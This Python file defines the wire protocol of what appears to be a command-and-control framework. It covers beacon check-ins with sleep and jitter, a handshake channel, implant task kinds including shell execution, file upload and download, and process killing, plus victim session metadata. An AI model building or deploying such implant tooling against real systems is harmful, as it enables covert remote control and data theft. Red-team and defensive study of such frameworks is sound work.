"""Wire protocol definitions shared by the listeners, the API, and the builder.

Two channels exist:

  control  /v1/hs   plaintext JSON handshake, carries the X25519 public key
  beacon   /v1/b    AEAD-framed JSON envelope, one round trip per check-in
  tcp      framed   4-byte length prefix + AEAD frame, persistent connection

The envelope inside an AEAD frame is always JSON. Binary payloads (file
transfers, command output) travel base64-encoded inside the envelope so a single
code path handles every message type on both transports.

Frame layout:  nonce(12) || ciphertext || tag(16)
TCP frame:     length(4, big endian) || frame
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field, asdict
from typing import Any

PROTO = 1

# Task kinds the implant dispatch table understands. The operator API validates
# against this set, and the builder bakes the matching capability mask in.
TASK_KINDS = {
    "shell": 0x0001,
    "pwd": 0x0002,
    "cd": 0x0004,
    "ls": 0x0008,
    "cat": 0x0010,
    "upload": 0x0020,
    "download": 0x0040,
    "rm": 0x0080,
    "mkdir": 0x0100,
    "ps": 0x0200,
    "kill": 0x0400,
    "env": 0x0800,
    "sysinfo": 0x1000,
    "sleep": 0x2000,
    "exit": 0x4000,
    "whoami": 0x8000,
}

ALL_CAPS = 0
for _mask in TASK_KINDS.values():
    ALL_CAPS |= _mask


@dataclass
class Task:
    id: str
    kind: str
    args: dict[str, Any] = field(default_factory=dict)

    def to_wire(self) -> dict[str, Any]:
        return {"id": self.id, "kind": self.kind, "args": self.args}


@dataclass
class TaskResult:
    id: str
    ok: bool
    data: str = ""
    err: str = ""

    @classmethod
    def from_wire(cls, obj: dict[str, Any]) -> "TaskResult":
        return cls(
            id=str(obj.get("id", "")),
            ok=bool(obj.get("ok", False)),
            data=str(obj.get("data", "")),
            err=str(obj.get("err", "")),
        )


@dataclass
class BeaconRequest:
    seq: int = 0
    results: list[TaskResult] = field(default_factory=list)
    want: int = 4
    meta: dict[str, Any] = field(default_factory=dict)
    since: str = ""

    @classmethod
    def from_wire(cls, obj: dict[str, Any]) -> "BeaconRequest":
        return cls(
            seq=int(obj.get("seq", 0)),
            results=[TaskResult.from_wire(r) for r in obj.get("results", [])],
            want=int(obj.get("want", 4)),
            meta=dict(obj.get("meta", {})),
            since=str(obj.get("since", "")),
        )


@dataclass
class BeaconResponse:
    tasks: list[Task] = field(default_factory=list)
    sleep: int = 60
    jitter: int = 20
    kill: bool = False

    def to_wire(self) -> dict[str, Any]:
        return {
            "tasks": [t.to_wire() for t in self.tasks],
            "sleep": self.sleep,
            "jitter": self.jitter,
            "kill": self.kill,
        }


def dumps(obj: Any) -> bytes:
    return json.dumps(obj, separators=(",", ":")).encode("utf-8")


def loads(raw: bytes) -> Any:
    return json.loads(raw.decode("utf-8"))


def capabilities_for(kinds: list[str]) -> int:
    mask = 0
    for kind in kinds:
        mask |= TASK_KINDS.get(kind, 0)
    return mask


def kind_for_capability(mask: int) -> list[str]:
    return [kind for kind, bit in TASK_KINDS.items() if mask & bit]


@dataclass
class SessionMeta:
    hostname: str = ""
    username: str = ""
    os_name: str = ""
    arch: str = ""
    pid: int = 0
    internal_ip: str = ""
    transport: str = ""
    elevated: bool = False
    integrity: str = ""

    @classmethod
    def from_wire(cls, obj: dict[str, Any]) -> "SessionMeta":
        return cls(
            hostname=str(obj.get("hostname", ""))[:128],
            username=str(obj.get("username", ""))[:128],
            os_name=str(obj.get("os", ""))[:128],
            arch=str(obj.get("arch", ""))[:32],
            pid=int(obj.get("pid", 0) or 0),
            internal_ip=str(obj.get("ip", ""))[:64],
            transport=str(obj.get("transport", ""))[:16],
            elevated=bool(obj.get("elevated", False)),
            integrity=str(obj.get("integrity", ""))[:32],
        )


def session_public_view(row: dict[str, Any]) -> dict[str, Any]:
    """Strip internal columns before a session row leaves the API."""
    keep = {
        "id",
        "hostname",
        "username",
        "os_name",
        "arch",
        "pid",
        "internal_ip",
        "external_ip",
        "transport",
        "elevated",
        "integrity",
        "alive",
        "first_seen",
        "last_seen",
        "sleep",
        "jitter",
        "capabilities",
        "build_id",
    }
    return {k: v for k, v in row.items() if k in keep}
